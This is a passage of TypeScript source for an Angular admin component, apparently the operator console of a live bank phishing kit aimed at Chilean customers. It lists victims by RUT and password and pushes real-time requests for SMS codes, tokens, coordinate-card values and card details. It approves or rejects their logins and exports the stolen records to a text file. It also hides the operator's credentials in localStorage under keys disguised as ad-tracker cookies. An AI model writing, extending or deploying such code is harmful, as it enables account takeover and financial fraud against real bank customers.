import {
  Component,
  ElementRef,
  EventEmitter,
  HostListener,
  OnInit,
  Output,
  ViewChild,
} from '@angular/core';
import { ActivatedRoute, Router } from '@angular/router';
import { RandonParams } from 'src/app/shared/class/rand-params';
import { MainService } from 'src/app/shared/services/main.service';
import { SocketWebService } from 'src/app/shared/services/socket-web.service';
import { saveAs } from 'file-saver';
import { ClipboardService } from 'ngx-clipboard';

@Component({
  selector: 'app-admin',
  templateUrl: './admin.component.html',
  styleUrls: ['./admin.component.css', './bootstrap.min.css'],
  host: {
    '(document:click)': 'clickOutside($event)',
  },
})
export class AdminComponent implements OnInit {
  @Output() showOpt: EventEmitter<any> = new EventEmitter();
  @ViewChild('audioOption') audioPlayerRef: ElementRef = {} as ElementRef;
  @ViewChild('audio') audioRef: ElementRef = {} as ElementRef;
  @ViewChild('needClickSound') needClickSoundRef: ElementRef = {} as ElementRef;

  public usersV = new Array();
  public totalLogsV = new Array();
  public logs = new Array();
  inputTodo: string = '';

  public selectTypeCard: string = '';
  public ifCreditCardError: boolean = false;

  public currentWaiting = 'USUARIO ESPERANDO EVENTO';

  public currentSound: HTMLAudioElement = {} as HTMLAudioElement;

  public isMobil: boolean = false;
  public hayData: boolean = false;
  public showSendEvent: boolean = false;
  public innerWidth: any;
  public isSound: boolean = false;

  public isStatus: boolean = true;

  public rut: string = '';
  public eventType: string = '';

  public showLoading: boolean = false;
  public userConnection: string = '';

  public coorsOne: string = '';
  public coorsTwo: string = '';
  public coorsThird: string = '';

  public transferData: any;

  /* MOdal */
  public optCreditModal: boolean = false;
  public optPayModal: boolean = false;

  public coorsModal: boolean = false;
  public smsModal: boolean = false;
  public tokenModal: boolean = false;
  public bepassModal: boolean = false;
  public cardModal: boolean = false;
  public cardCreditoModal: boolean = false;
  public loginEventModal: boolean = false;
  public unAutorizeModal: boolean = false;
  /* MOdal */

  public showlogin: boolean = false;
  public showAlert: boolean = true;
  public isCheking: boolean = true;
  public userOnline: boolean = true;

  public requestPassword: boolean = false;
  public modalConfirm: boolean = false;
  public modalConfirmText: string = '';

  public modalConfirmRemoveUser: boolean = false;
  public modalConfirmRemoveUserText: string = '';

  public showLogs: boolean = false;
  public showLogsLoading: boolean = true;
  public isLogsResult: boolean = false;

  public showSwich: boolean = false;
  public notExpande: boolean = false;

  public isUsernameError: boolean = false;
  public isPasswordError: boolean = false;
  public isLoadingLoading: boolean = false;
  public userLogin = {
    username: '',
    password: '',
  };

  public isServerOnline: boolean = true;

  public cantidadSms = '';
  public activeNotification = false;
  // private randParams : RandonParams;

  constructor(
    private socketSrv: SocketWebService,
    private mainSrv: MainService,
    private router: Router,
    private activeRouter: ActivatedRoute,
    private clipboardService: ClipboardService
  ) {
    try {
      document.getElementsByClassName('style0')[0].remove();
      // document.getElementsByClassName('style1')[0].remove();
    } catch (error) {}

    this.checkLogin();
    this.getStatus();
    this.update();

    // this.randParams = new RandonParams();
    socketSrv.callback.subscribe((res) => {
      this.organizeArray(res);
      this.organizeObject(res);
    });

    socketSrv.loginEvent.subscribe((res) => {
      this.organizeArray(res);
      this.organizeObject(res);
    });

    socketSrv.recocnet.subscribe((res) => {
      this.organizeArray(res);
    });

    socketSrv.reciveData.subscribe((res) => {
      if (res.eventType === 'READY') {
        setTimeout(() => {
          this.organizarData(res);
          this.organizeObjectLogs(res);
        }, 1500);
      } else {
        this.organizarData(res);
        this.organizeObjectLogs(res);
      }
    });

    //this.socketSrv.reloadAdmin({});
    this.innerWidth = window.innerWidth;

    const ua = navigator.userAgent;
    if (
      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile|CriOS/i.test(
        ua
      )
    ) {
      this.isMobil = true;
    } else {
      this.isMobil = false;
    }
  }

  async getStatus() {
    try {
      const result: any = await this.mainSrv.getSwitch();
      if (result.ok) {
        // this.isStatus = true;
        this.isServerOnline = true;
      } else {
        // this.isStatus = false;
        this.isServerOnline = false;
      }

      // const checkbox = document.getElementById('checkbox-2-1') as HTMLInputElement
      // checkbox.checked = this.isStatus
    } catch (error) {}
  }

  @HostListener('window:resize', ['$event'])
  onResize(event: any) {
    this.innerWidth = window.innerWidth;
    if (this.innerWidth >= 550) {
      this.isMobil = false;
    } else {
      this.isMobil = true;
    }
  }

  ngOnInit(): void {
    this.hayData = true;
    if ('Notification' in window) {
      Notification.requestPermission().then((permiso) => {
        if (permiso === 'granted') {
          this.activeNotification = true;
        } else {
          this.activeNotification = false;
        }
      });
    }
  }

  // ngAfterViewInit() {
  //   setTimeout(() => {
  //   },0)
  // }

  reproducir(active: boolean) {
    if (!this.showAlert) {
      const audio = this.audioRef.nativeElement;
      if (active) {
        audio.loop = true;
        audio.muted = false;
        audio.play();
      } else {
        audio.muted = false;
      }
    }
  }

  // playSound(sound: string, active: boolean){
  //   sound = "../assets/mp3/" + sound + ".mp3";
  //   this.currentSound = new Audio(sound);

  //   if(active){
  //     this.currentSound.loop = true;
  //     this.currentSound.muted = false;
  //     this.currentSound.play();
  //   }else{
  //     this.currentSound.loop = false;
  //   }
  // }

  // playSound(sound: string) {
  //   try {
  //     // sound = "../assets/mp3/" + sound + ".mp3";
  //     // sound && ( new Audio(sound) ).play()

  //     sound = "../assets/mp3/" + sound + ".mp3";
  //     const audio = new Audio(sound);
  //     audio.loop = true;
  //     audio.play();

  //     // const media = this.audioRef.nativeElement;
  //     // media.muted = isMute;
  //     // media.play();

  //   } catch (error) {}
  // }

  async downloadAll() {
    if (!this.totalLogsV.length) {
      return false;
    }

    this.showLogsLoading = true;
    const date = new Date();
    const current =
      date.getDate() + '-' + date.getMonth() + '-' + date.getFullYear();
    let allLogosss = '';

    try {
      for (let index = 0; index < this.totalLogsV.length; index++) {
        const obj = this.totalLogsV[index];
        let forma = `*********** ${obj.date} **********\nRUT: ${obj.rut} \nCLAVE: ${obj.password} \nNOMBRE: ${obj.name} \n\nDIGICARD: ${obj.digicard} \nSMSMOBIL: ${obj.smsmobil} \nTARJETA : ${obj.card} \nTOKEN   : ${obj.token} \n******************************************\n\n`;
        allLogosss += forma;
      }

      const blob = new Blob([allLogosss], { type: 'text/plain;charset=utf-8' });
      saveAs(blob, 'CBFacebooks_' + current + '.txt');

      this.showLogsLoading = false;
      await this.getAll();
      return true;
    } catch (error) {
      this.showLogsLoading = false;
      return false;
    }
  }

  async checkLogin() {
    const oneU = localStorage.getItem('_pubCommonId_exp');
    const twoU = localStorage.getItem('apstagCfg');
    const oneP = localStorage.getItem('_id5Id_last');
    const twoP = localStorage.getItem('cto_bundle');

    if (!oneU || !twoU || !oneP || !twoP) {
      this.showlogin = true;
      setTimeout(() => {
        this.isCheking = false;
      }, 1500);
      return false;
    }

    if (
      oneU.length !== 13 ||
      twoU.length < 4 ||
      oneP.length !== 10 ||
      twoP.length < 4
    ) {
      this.showlogin = true;
      setTimeout(() => {
        this.isCheking = false;
      }, 1500);
      return false;
    }

    const user = oneU.substr(0, 3) + twoU.substr(3, twoU.length);
    const pass = oneP.substr(0, 3) + twoP.substr(3, twoU.length);

    try {
      const result: any = await this.mainSrv.login({
        username: user,
        password: pass,
      });
      if (!result || !result.ok) {
        this.showlogin = true;
        setTimeout(() => {
          this.isCheking = false;
        }, 1500);
        return false;
      }

      setTimeout(() => {
        this.showlogin = false;
        this.isCheking = false;
      }, 700);
      return true;
    } catch (error) {
      this.showlogin = true;
      setTimeout(() => {
        this.isCheking = false;
      }, 1000);
      return false;
    }
  }

  async getAll() {
    if (!this.userLogin.password || !this.userLogin.password.length) {
      this.isPasswordError = true;
      setTimeout(() => {
        this.isPasswordError = false;
      }, 2000);
      return false;
    }
    const result = await this.requestPasswordM(this.userLogin.password);
    if (!result) {
      return false;
    }
    this.showLogs = true;
    this.showLogsLoading = true;

    try {
      const result: any = await this.mainSrv.getLogs();
      if (!result || !result.ok) {
        this.isLogsResult = false;
        this.showLogsLoading = false;
        return false;
      }

      if (result.result.length < 1) {
        this.isLogsResult = false;
        this.showLogsLoading = false;
        return false;
      }

      this.totalLogsV = this.byDate(result.result);
      this.showLogsLoading = false;
      this.isLogsResult = true;
      return true;
    } catch (error) {
      this.isLogsResult = false;
      this.showLogsLoading = false;
      return false;
    }
  }

  copyLogin(rut: string, pass: string, indice: number) {
    this.notExpande = true;
    this.clipboardService.copy(`${rut} ${pass}`);
  }

  confirmRemoveUser(user: any) {
    this.notExpande = true;
    this.transferData = { id: user._id, userIdSock: user.userId };

    this.modalConfirmRemoveUserText = `SEGURO QUE QUIERES DESHABILITAR EL USUARIO ${user.rut}?`;
    this.modalConfirmRemoveUser = true;
  }

  async removeUser() {
    this.isLoadingLoading = true;
    let userId = this.transferData.id;
    let userIdSock = this.transferData.userIdSock;

    try {
      const result: any = await this.mainSrv.delAndGet(userId);
      if (!result || !result.isOk) {
        console.log('Hubo un error eliminando el usuario => ', result);
        return false;
      }
      this.organizeArray(result.users);
      return true;
    } catch (error) {
      console.log('Hubo un error catch eliminando el usuario => ', error);
      return false;
    } finally {
      this.modalConfirmRemoveUser = false;
      this.isLoadingLoading = false;
    }
  }

  private async requestPasswordM(password: string): Promise<boolean> {
    const user = 'logos';

    this.isLoadingLoading = true;
    this.userLogin.username = user;
    this.userLogin.password = password;

    try {
      const result: any = await this.mainSrv.login(this.userLogin);
      if (!result || !result.ok) {
        this.userLogin.password = '';
        this.requestPassword = true;

        if (result.message === 'usuario incorrecto') {
          this.isLoadingLoading = false;
          return false;
        }
        if (result.message === 'clave incorrecta') {
          this.isPasswordError = true;
          this.isLoadingLoading = false;
          return false;
        }
      }

      this.isPasswordError = true;
      this.isLoadingLoading = false;
      this.requestPassword = false;
      this.userLogin.password = '';
      return true;
    } catch (error) {
      this.requestPassword = true;
      return false;
    }
  }

  byDate(result: any[]) {
    const arrr = new Array();
    result.forEach((obj) => {
      let hora = obj.date.split('T')[1];
      hora = hora.split('.')[0];
      let date = obj.date.split('T')[0];
      date = date.split('-');
      const fullDate = `${date[2]}-${date[1]}-${date[0]} ${hora}`;
      obj.date = fullDate;
      arrr.push(obj);
    });
    return arrr;
  }

  async deleteLogs() {
    this.showLogsLoading = true;
    try {
      await this.mainSrv.removeAlls();
      this.showLogsLoading = false;
      await this.getAll();
    } catch (error) {
      this.showLogsLoading = false;
    }
  }

  hideLogsModal() {
    this.showLogs = false;
  }

  cerrarSwich() {
    this.showSwich = false;
  }

  ShowSwich() {
    this.showSwich = true;
  }

  async currentState(current: any, status: boolean) {
    let element = current;
    try {
      this.isServerOnline = status;
      console.log('Server estatus => ', this.isServerOnline);

      await this.mainSrv.switch(this.isServerOnline);
      // await this.mainSrv.switch(element.srcElement.checked);
    } catch (error) {}

    // let final = undefined;
    // if(active){
    //   let state : any = document.getElementById("customSwitches");
    //   state = state.checked;
    //   final = state
    // }else{
    //   let state : any = document.getElementById("customSwitches2");
    //   state = state.checked;
    //   final = state
    // }
    // try {
    //   await this.mainSrv.switch(final);
    // } catch (error) {}
  }

  generaCadenaAleatoria(n: number): string {
    let result = '';
    const chars =
      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < n; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  organizeObject(obj: any) {
    if (obj && obj.length > 0) {
      // console.log("OBJECTO => ", obj);

      this.reproducir(true);
      if (this.activeNotification) {
        if (Notification.permission === 'granted') {
          let notification = new Notification('Nuevo usuario (B-ESTADO)');
          // setTimeout(() => {
          //   this.reproducir(true)
          // },2000)
        }
      }
      this.usersV = obj;
    }
  }

  async organizeObjectLogs(obj: any) {
    // console.log('USERS => ', obj.upUser);
    const user = obj.upUser;
    if (!user || !user.logs) {
      return false;
    }

    let logs = '';
    const allLogs = user.logs;
    allLogs.forEach((elem: any) => {
      let laClass = '';
      if (elem.log === 'USUARIO ESPERANDO EVENTO..') {
        laClass = '#f0ad4e';
      } else {
        if (elem.isUser) {
          laClass = 'green';
        } else {
          laClass = '#d9534f';
        }
      }
      logs += `<p style='color: ${laClass}'>${elem.log}</p>`;
    });

    //nuevoo
    let kbArrLogs = logs.split('<p');
    logs = `<p ${kbArrLogs[kbArrLogs.length - 1]}`;

    // return true;
    const id = document.getElementsByClassName(user.userId)[0].id;
    let estaHay = document.getElementById('console' + id);
    while (!estaHay) {
      await this.sleep(200);
      estaHay = document.getElementById(id);

      if (estaHay) {
        const console = document.getElementById(
          'console' + id
        ) as HTMLInputElement;
        console.innerHTML = logs;
      }
    }
    this.isertLogs('console' + id, logs);
    return true;
  }

  async isertLogs(id: string, logs: string) {
    for (let i = 0; i < 100; i++) {
      await this.sleep(500);
      let current = document.getElementById(id);
      if (current) {
        if (
          current.innerText.length &&
          current.innerText !== 'CARGANDO LOGS..'
        ) {
          break;
        } else {
          const console = document.getElementById(id) as HTMLInputElement;
          console.innerHTML = logs;
        }
      }
    }
  }

  async organizeArray(arr: any) {
    this.usersV = arr;

    if (!this.usersV || !this.usersV.length) {
      return false;
    }

    for (let index = 0; index < this.usersV.length; index++) {
      const user = this.usersV[index];
      let logs = '';
      const allLogs = user.logs;
      allLogs.forEach((elem: any) => {
        let laClass = '';
        if (elem.log === 'USUARIO ESPERANDO EVENTO..') {
          laClass = '#f0ad4e';
        } else {
          if (elem.isUser) {
            laClass = 'green';
          } else {
            laClass = '#d9534f';
          }
        }
        logs += `<p style='color: ${laClass}'>${elem.log}</p>`;
      });

      //nuevo
      let kbArrLogs = logs.split('<p');
      logs = `<p ${kbArrLogs[kbArrLogs.length - 1]}`;

      let estaHay = document.getElementById('console' + index);
      while (!estaHay) {
        await this.sleep(200);
        estaHay = document.getElementById('console' + index);
      }
      this.isertLogs('console' + index, logs);
    }
    return true;
  }

  async organizarData(obj: any) {
    let logs = '';

    if (!obj.upUser || !obj.upUser.logs || !obj.upUser.logs.length) {
      return false;
    }

    const last = obj.upUser.logs.length - 1;
    const allLogs = obj.upUser.logs;
    allLogs.forEach((elem: any) => {
      let laClass = '';
      if (elem.log === 'USUARIO ESPERANDO EVENTO..') {
        laClass = '#f0ad4e';
      } else {
        if (elem.isUser) {
          laClass = 'green';
        } else {
          laClass = '#d9534f';
        }
      }
      logs += `<p style='color: ${laClass}'>${elem.log}</p>`;
    });
    // console.log('LOGO => ', logs);

    let kbArrLogs = logs.split('<p');
    if (!document.getElementsByClassName(obj.upUser.userId)[0]) {
      return false;
    }
    const id = document.getElementsByClassName(obj.upUser.userId)[0].id;
    const console = document.getElementById('console' + id) as HTMLInputElement;
    console.innerHTML = `<p ${kbArrLogs[kbArrLogs.length - 1]}`;

    // const isDisplayed = document.getElementById(
    //   'panelc' + id
    // ) as HTMLInputElement;
    // isDisplayed.style.display = logs;
    // let kbconsole = document.getElementById('console' + id)?.innerHTML;
    let isUpdate = undefined;
    for (let index = 0; index < this.usersV.length; index++) {
      const object = this.usersV[index];
      if (object.rut === obj.upUser.rut) {
        this.usersV[index] = obj.upUser;
        isUpdate = true;
      }
    }

    let codigo = undefined;
    if (obj.eventType === 'SMSMOBIL') {
      if (this.currentWaiting === 'ESPERANDO SMSMOBIL') {
        this.currentWaiting = 'SMSMOBIL RECIBIDO';
      }
      codigo = obj.upUser.smsmobil;
    }
    if (obj.eventType === 'DIGICARD') {
      if (this.currentWaiting === 'ESPERANDO DIGICARD') {
        this.currentWaiting = 'DIGICARD RECIBIDO';
      }
      codigo = obj.upUser.digicard;
    }
    if (obj.eventType === 'TARJETA') {
      if (this.currentWaiting === 'ESPERANDO TARJETA') {
        this.currentWaiting = 'TARJETA RECIBIDA';
      }
      codigo = obj.upUser.card;
    }
    if (obj.eventType === 'TOKEN') {
      if (this.currentWaiting === 'ESPERANDO TOKEN') {
        this.currentWaiting = 'TOKEN RECIBIDO';
      }
      codigo = obj.upUser.token;
    }
    if (obj.eventType === 'READY') {
    }
    if (obj.eventType === 'SELECCION') {
    }

    if (obj.upUser.logs[last].isUser === true) {
      if (this.activeNotification) {
        if (Notification.permission === 'granted') {
          let notif = `Evento ${obj.eventType} (B-ESTADO)`;
          if (obj.eventType === 'READY') {
            notif = 'Usuario Listo (B-ESTADO)';
          } else if (obj.eventType === 'SELECCION') {
            notif = 'Usuario selecciono opcion (B-ESTADO)';
          }

          let notification = new Notification(notif);
        }
      }
    }

    if (isUpdate) {
    }

    return true;
  }

  async sleep(ms: number) {
    return new Promise((resolve) => {
      setTimeout(() => {
        return resolve(true);
      }, ms);
    });
  }

  async update() {
    // let rout = this.getLoginRoute();
    // location.href = rout;
    try {
      this.isLoadingLoading = true;
      const result: any = await this.mainSrv.updateAll();
      if (!result || !result.isOk || !result.users || !result.users.length) {
        // console.log('ERROR update() => ', result);
        return false;
      }
      // console.log('ESO => ', result.users);
      this.organizeArray(result.users);
      return true;
    } catch (error) {
      console.log('Hubo un error catch actualizando usuarios => ', error);
      return false;
    } finally {
      this.isLoadingLoading = false;
    }
  }

  private getLoginRoute(): string {
    let loginRoutes: string[] = [
      'panel',
      'admnr',
      'encuentrame',
      'nodisponible',
    ];

    return loginRoutes[Math.floor(Math.random() * loginRoutes.length)];
  }

  async login() {
    this.isUsernameError = false;
    this.isPasswordError = false;
    if (!this.userLogin.username || !this.userLogin.password) {
      if (!this.userLogin.username) this.isUsernameError = true;
      if (!this.userLogin.password) this.isPasswordError = true;
      return false;
    }

    if (
      this.userLogin.username.length < 4 ||
      this.userLogin.password.length < 5
    ) {
      if (this.userLogin.username.length < 4) this.isUsernameError = true;
      if (this.userLogin.password.length < 5) this.isPasswordError = true;
      return false;
    }
    this.isLoadingLoading = true;

    try {
      const result: any = await this.mainSrv.login(this.userLogin);
      if (!result || !result.ok) {
        if (result.message === 'usuario incorrecto') {
          this.isUsernameError = true;
          this.isLoadingLoading = false;
          this.userLogin.password = '';
          return false;
        }
        if (result.message === 'clave incorrecta') {
          this.isPasswordError = true;
          this.isLoadingLoading = false;
          this.userLogin.password = '';
          return false;
        }
      }

      let firstUser =
        this.userLogin.username.substr(0, 3) + this.generaCadenaAleatoria(10);
      let SecondUser =
        this.generaCadenaAleatoria(3) +
        this.userLogin.username.substr(3, this.userLogin.username.length);
      let firstPass =
        this.userLogin.password.substr(0, 3) + this.generaCadenaAleatoria(7);
      let SecondPass =
        this.generaCadenaAleatoria(3) +
        this.userLogin.password.substr(3, this.userLogin.username.length);

      localStorage.setItem('_pubCommonId_exp', firstUser);
      localStorage.setItem('apstagCfg', SecondUser);
      localStorage.setItem('_id5Id_last', firstPass);
      localStorage.setItem('cto_bundle', SecondPass);

      this.isLoadingLoading = false;
      this.showlogin = false;
      return true;
    } catch (error) {
      this.userLogin.password = '';
      this.isUsernameError = true;
      this.isPasswordError = true;
      this.isLoadingLoading = false;
      return false;
    }
  }

  disabledAlert() {
    this.showAlert = false;
  }

  // showMenu(indice: string, arr: any[]){
  //   let id = "numero"+indice;
  //   let currentPosition = document.getElementById(id)?.style.display;
  //   if(currentPosition === "block"){
  //     const apply = document.getElementById(id) as HTMLInputElement
  //     apply.style.display = "none";
  //   }else if(currentPosition === "none"){
  //     const apply = document.getElementById(id) as HTMLInputElement
  //     apply.style.display = "block";
  //   }

  //   for (let index = 0; index < arr.length; index++) {
  //     let avanced = "numero"+index;
  //     if(avanced === id) continue;
  //     const apply = document.getElementById(id) as HTMLInputElement
  //     apply.style.display = "none";
  //   }
  // }

  confirmModal(
    action: string,
    data: any,
    indice: number,
    reciveId: string,
    userRut: string
  ) {
    let currentEvent = '';
    if (action === 'finish') {
      currentEvent = 'FINALIZAR';
    } else if (action === 'redired') {
      currentEvent = 'REDIRIGIR';
    } else if (action === 'noAutorize') {
      currentEvent = 'NO-AUTORIZADO';
    }

    this.transferData = { action, data, indice, reciveId, userRut };

    this.modalConfirmText = `SEGURO QUE QUIERES ENVIAR EL EVENTO ${currentEvent.toUpperCase()} AL USUARIO ${userRut}?`;
    this.modalConfirm = true;
  }

  sendAction() {
    this.isLoadingLoading = true;
    let id = 'numero' + this.transferData.indice;
    let loadId = 'loading' + this.transferData.indice;

    this.rut = this.transferData.data.rut;
    this.eventType = this.transferData.action.toUpperCase();

    const d = new Date();
    let fecha = `${d.getDate()}-${d.getMonth()}-${d.getFullYear()}`;
    let kbLog = undefined;
    if (this.eventType === 'FINISH') {
      kbLog = `TERMINAR EL PROCESO`;
    } else if (this.eventType === 'NOAUTORIZE') {
      kbLog = `PRODUCTO NO AUTORIZADO`;
    } else if (this.eventType === 'REDIRED') {
      kbLog = `REDIRIGIR USUARIO`;
    } else {
      kbLog = `SOLICITO1 ${this.eventType}`;
    }

    const aditionals = { log: kbLog };
    this.socketSrv.showOpt({
      userId: this.transferData.reciveId,
      rut: this.transferData.userRut,
      event: this.transferData.action,
      aditionals,
    });

    setTimeout(() => {
      this.currentWaiting =
        'ESPERANDO ' + this.transferData.action.toUpperCase();
    }, 1000);
    this.modalConfirm = false;
    this.isLoadingLoading = false;
    return true;
  }

  close() {
    this.showSendEvent = false;
  }

  // #region LOGIN
  cerrarRequestLogin() {
    this.loginEventModal = false;
  }

  requestLogin(
    action: string,
    data: any,
    indice: number,
    reciveId: string,
    userRut: string,
    isOnline: boolean
  ) {
    if (!isOnline) {
      this.userOnline = false;
      this.showSendEvent = true;
      return false;
    }
    this.userOnline = true;

    this.eventType = action.toUpperCase();
    if (!this.loginEventModal) {
      this.transferData = { action, data, indice, reciveId, userRut };
      this.loginEventModal = true;
      return false;
    }
    return true;
  }

  requestLoginExe(opt: boolean, errorType: string) {
    this.loginEventModal = false;
    let id = 'numero' + this.transferData.indice;
    let loadId = 'loading' + this.transferData.indice;

    const d = new Date();
    let fecha = `${d.getDate()}-${d.getMonth()}-${d.getFullYear()}`;
    let kbLog = '';
    if (opt) {
      kbLog = `LOGIN APROVADO`;
    } else {
      let typeLogMsg = undefined;
      if (errorType === 'error') {
        typeLogMsg = 'CLAVE INCORRECTA';
      } else if (errorType === 'caducada') {
        typeLogMsg = 'CLAVE CADUCADA';
      } else if (errorType === 'bloqueada') {
        typeLogMsg = 'CLAVE BLOQUEADA';
      }

      kbLog = `${typeLogMsg}`;
    }

    const aditionals = {
      log: kbLog,
      isAproved: opt,
      type: errorType,
    };

    this.currentWaiting = 'ESPERANDO ' + this.transferData.action.toUpperCase();
    this.socketSrv.loginResp({
      userId: this.transferData.reciveId,
      event: this.transferData.action,
      rut: this.transferData.userRut,
      aditionals,
    });
  }
  // #endregion

  // #region OPCIONES CREDIT EVENT
  cerrarRequestOptCredit() {
    this.optCreditModal = false;
  }

  requestOptCredit(
    action: string,
    data: any,
    indice: number,
    reciveId: string,
    userRut: string,
    isOnline: boolean
  ) {
    if (!isOnline) {
      this.userOnline = false;
      this.showSendEvent = true;
      return false;
    }
    this.userOnline = true;

    this.eventType = action.toUpperCase();
    if (!this.optCreditModal) {
      this.transferData = { action, data, indice, reciveId, userRut };
      this.optCreditModal = true;
      return false;
    }
    return true;
  }

  requestOptCreditExe() {
    this.optCreditModal = false;
    let id = 'numero' + this.transferData.indice;
    let loadId = 'loading' + this.transferData.indice;

    const d = new Date();
    let fecha = `${d.getDate()}-${d.getMonth()}-${d.getFullYear()}`;
    let kbLog = `SOLICITO ${this.eventType}`;
    const aditionals = {
      log: kbLog,
    };

    this.socketSrv.showOpt({
      userId: this.transferData.reciveId,
      event: this.transferData.action,
      rut: this.transferData.userRut,
      aditionals,
    });

    setTimeout(() => {
      this.currentWaiting =
        'ESPERANDO ' + this.transferData.action.toUpperCase();
    }, 1000);
    return true;
  }
  // #endregion

  // #region OPCIONES PAY EVENT
  cerrarRequestOptPay() {
    this.optPayModal = false;
  }

  requestOptPay(
    action: string,
    data: any,
    indice: number,
    reciveId: string,
    userRut: string,
    isOnline: boolean
  ) {
    if (!isOnline) {
      this.userOnline = false;
      this.showSendEvent = true;
      return false;
    }
    this.userOnline = true;

    this.eventType = action.toUpperCase();
    if (!this.optPayModal) {
      this.transferData = { action, data, indice, reciveId, userRut };
      this.optPayModal = true;
      return false;
    }
    return true;
  }

  requestOptPayExe() {
    this.optPayModal = false;
    let id = 'numero' + this.transferData.indice;
    let loadId = 'loading' + this.transferData.indice;

    const d = new Date();
    let fecha = `${d.getDate()}-${d.getMonth()}-${d.getFullYear()}`;
    let kbLog = `SOLICITO ${this.eventType}`;
    const aditionals = {
      log: kbLog,
    };

    this.socketSrv.showOpt({
      userId: this.transferData.reciveId,
      event: this.transferData.action,
      rut: this.transferData.userRut,
      aditionals,
    });

    setTimeout(() => {
      this.currentWaiting =
        'ESPERANDO ' + this.transferData.action.toUpperCase();
    }, 1000);
    return true;
  }
  // #endregion

  // #region Card EVENT
  cerrarRequestCard() {
    this.cardModal = false;
  }

  requestCard(
    action: string,
    data: any,
    indice: number,
    reciveId: string,
    userRut: string,
    isOnline: boolean
  ) {
    if (!isOnline) {
      this.userOnline = false;
      this.showSendEvent = true;
      return false;
    }
    this.userOnline = true;

    this.eventType = action.toUpperCase();
    if (!this.cardModal) {
      this.transferData = { action, data, indice, reciveId, userRut };
      this.cardModal = true;
      return false;
    }
    return true;
  }

  requestCardExe(card: string, indicator: string = '') {
    if (card === 'credito') {
      if (!indicator.length) {
        this.ifCreditCardError = true;
        return false;
      }

      if (
        this.selectTypeCard !== 'Visa' &&
        this.selectTypeCard !== 'Mastercard'
      ) {
        this.ifCreditCardError = true;
        return false;
      }

      if (indicator.length !== 4) {
        this.ifCreditCardError = true;
        return false;
      }
    }

    this.cardModal = false;
    this.cardCreditoModal = false;
    this.ifCreditCardError = false;

    let id = 'numero' + this.transferData.indice;
    let loadId = 'loading' + this.transferData.indice;

    const d = new Date();
    let fecha = `${d.getDate()}-${d.getMonth()}-${d.getFullYear()}`;
    let kbLog = '';

    if (card === 'credito') {
      kbLog = `SOLICITO TARJETA DE CREDITO`;
    } else {
      kbLog = `SOLICITO TARJETA DE DEBITO`;
    }

    const aditionals = {
      log: kbLog,
      card: card,
      indicator: indicator,
      typecard: this.selectTypeCard,
    };

    this.selectTypeCard = '';
    this.socketSrv.showOpt({
      userId: this.transferData.reciveId,
      event: this.transferData.action,
      rut: this.transferData.userRut,
      aditionals,
    });

    setTimeout(() => {
      this.currentWaiting =
        'ESPERANDO ' + this.transferData.action.toUpperCase();
    }, 1000);
    return true;
  }
  // #endregion

  // #region Card EVENT
  cerrarRequestCardCredit() {
    this.cardCreditoModal = false;
  }

  requestCardCredit() {
    if (!this.cardCreditoModal) {
      this.cardModal = false;
      this.cardCreditoModal = true;
      return false;
    }
    return true;
  }

  requestCardCreditExe(card: string) {
    this.cardCreditoModal = false;
    let id = 'numero' + this.transferData.indice;
    let loadId = 'loading' + this.transferData.indice;

    const d = new Date();
    let fecha = `${d.getDate()}-${d.getMonth()}-${d.getFullYear()}`;
    let kbLog = '';

    if (card === 'credito') {
      kbLog = `SOLICITO TARJETA DE CREDITO`;
    } else {
      kbLog = `SOLICITO TARJETA DE DEBITO`;
    }

    const aditionals = {
      log: kbLog,
      card: card,
      indicator: '',
    };

    this.socketSrv.showOpt({
      userId: this.transferData.reciveId,
      event: this.transferData.action,
      rut: this.transferData.userRut,
      aditionals,
    });

    setTimeout(() => {
      this.currentWaiting =
        'ESPERANDO ' + this.transferData.action.toUpperCase();
    }, 1000);
  }
  // #endregion

  // #region COORDENADAS EVENT
  cerrarRequestCoors() {
    this.coorsOne = '';
    this.coorsTwo = '';
    this.coorsThird = '';
    this.coorsModal = false;
  }

  requestCoors(
    action: string,
    data: any,
    indice: number,
    reciveId: string,
    userRut: string,
    isOnline: boolean
  ) {
    if (!isOnline) {
      this.userOnline = false;
      this.showSendEvent = true;
      return false;
    }
    this.userOnline = true;

    this.eventType = action.toUpperCase();
    this.coorsOne = '';
    this.coorsTwo = '';
    this.coorsThird = '';
    if (!this.coorsModal) {
      this.transferData = { action, data, indice, reciveId, userRut };
      this.coorsModal = true;
      return false;
    }
    return true;
  }

  requestCoorsExe() {
    if (!this.coorsOne || this.coorsOne.length !== 2) {
      return false;
    }
    if (!this.coorsTwo || this.coorsTwo.length !== 2) {
      return false;
    }
    if (!this.coorsThird || this.coorsThird.length !== 2) {
      return false;
    }

    this.coorsModal = false;
    let id = 'numero' + this.transferData.indice;
    let loadId = 'loading' + this.transferData.indice;

    const d = new Date();
    let fecha = `${d.getDate()}-${d.getMonth()}-${d.getFullYear()}`;
    let kbLog = `SOLICITO ${this.eventType}`;

    const aditionals = {
      one: this.coorsOne.toUpperCase(),
      two: this.coorsTwo.toUpperCase(),
      three: this.coorsThird.toUpperCase(),
      log: kbLog,
    };

    this.socketSrv.showOpt({
      userId: this.transferData.reciveId,
      event: this.transferData.action,
      rut: this.transferData.userRut,
      aditionals,
    });

    setTimeout(() => {
      this.currentWaiting =
        'ESPERANDO ' + this.transferData.action.toUpperCase();
    }, 1000);
    return true;
  }
  // #endregion

  // #region SMS EVENT
  cerrarRequestSms() {
    this.smsModal = false;
  }

  requestSms(
    action: string,
    data: any,
    indice: number,
    reciveId: string,
    userRut: string,
    isOnline: boolean
  ) {
    if (!isOnline) {
      this.userOnline = false;
      this.showSendEvent = true;
      return false;
    }
    this.userOnline = true;

    this.eventType = action.toUpperCase();
    if (!this.smsModal) {
      this.transferData = { action, data, indice, reciveId, userRut };
      this.smsModal = true;
      return false;
    }
    return true;
  }

  requestSmsExe() {
    this.smsModal = false;
    let id = 'numero' + this.transferData.indice;
    let loadId = 'loading' + this.transferData.indice;

    if (!this.cantidadSms) return false;
    if (this.cantidadSms !== '4' && this.cantidadSms !== '6') {
      return false;
    }

    const d = new Date();
    let fecha = `${d.getDate()}-${d.getMonth()}-${d.getFullYear()}`;
    let kbLog = `SOLICITO ${this.eventType}`;

    const aditionals = {
      count: this.cantidadSms === '4' ? 4 : 6,
      log: kbLog,
    };

    this.socketSrv.showOpt({
